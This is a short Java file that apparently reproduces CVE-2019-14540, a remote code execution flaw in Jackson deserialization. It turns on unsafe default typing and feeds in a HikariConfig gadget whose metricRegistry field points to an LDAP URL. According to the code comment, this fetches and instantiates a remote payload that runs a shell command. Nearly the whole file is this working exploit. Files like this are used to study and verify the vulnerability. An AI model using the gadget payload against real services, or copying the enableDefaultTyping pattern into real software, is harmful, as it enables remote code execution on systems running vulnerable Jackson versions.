package com.anonuser;

import com.fasterxml.jackson.databind.ObjectMapper;

public class Jackson_CVE_2019_14540 {
    
    public static void main(String[] args) {
        System.out.println("Recreating CVE-2019-14540");

        // This pulls and instantiates a payload from the LDAP server. Shell command, defined when starting the LDAP server, is executed

        //        ["com.zaxxer.hikari.HikariConfig", {"metricRegistry":"ldap://localhost:1389/Exploit"}]
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            mapper.readValue("[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://127.0.0.1:1389/o=reference\"}]".getBytes(), Object.class);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
